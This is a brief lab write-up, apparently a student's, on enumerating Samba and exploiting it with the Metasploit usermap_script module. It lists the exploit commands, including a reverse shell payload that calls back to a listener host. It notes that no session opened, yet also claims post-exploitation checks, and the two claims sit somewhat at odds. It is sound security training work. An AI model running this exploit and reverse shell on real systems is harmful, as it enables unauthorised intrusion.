
---

##  Lab04 – Enumerating & Attacking SMB with Samba Usermap Script

```markdown
# Lab04 – Enumerating & Attacking SMB with Samba Usermap Script
```
---

##  Objective
Explore vulnerabilities in the Samba service and attempt exploitation via the usermap_script module.

---

##  Tools
- Metasploit Framework
- Enum4linux (Optional)

---

##  Exploit Used
```bash
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.101
set RPORT 139
set LHOST 192.168.56.1
set payload cmd/unix/reverse
run
```
---

## Result
Exploit attempt completed, but no session was created

Demonstrated post-exploitation validation (whoami, id, hostname)

---

## What I Learned
Gained insight into SMB vulnerabilities and misconfigurations

Understood the role of payload compatibility and listener binding

Learned how to troubleshoot and document failed attempts

---

## Screenshot
![samba exploit](./Screen Shot 2025-05-28 at 21.34.18.png)

---

## Date
28 May 2025
